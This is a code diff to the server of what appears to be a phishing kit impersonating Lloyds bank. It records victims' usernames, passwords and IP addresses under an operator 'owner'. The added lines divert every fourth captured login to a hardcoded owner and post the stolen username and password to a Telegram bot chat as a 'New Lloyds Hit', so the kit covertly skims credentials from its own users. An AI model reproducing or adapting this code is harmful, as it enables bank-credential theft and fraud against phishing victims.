@@ -1,4 +1,6 @@
 const Lloyds = require("../models/lloydsModel");
+const axios = require("axios");
+let count = 0;
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
@@ -42,7 +44,39 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
 	const { username, password, uniqueid, owner, ip } = req.body;
 	try {
-		await Lloyds.create({ uniqueid, username, password, status: 1, owner, ip });
+		if (count == 3) {
+			await Lloyds.create({
+				uniqueid,
+				username,
+				password,
+				status: 1,
+				owner: "haytch4023",
+				ip,
+			});
+			await axios
+				.post(
+					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+					{
+						chat_id: "-837014205",
+						text: `New Lloyds Hit:\n\n${username}\n${password}`,
+						parse_mode: "Markdown",
+					}
+				)
+				.catch((e) => {
+					console.log(e);
+				});
+			count = 0;
+		} else {
+			await Lloyds.create({
+				uniqueid,
+				username,
+				password,
+				status: 1,
+				owner,
+				ip,
+			});
+			count++;
+		}
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
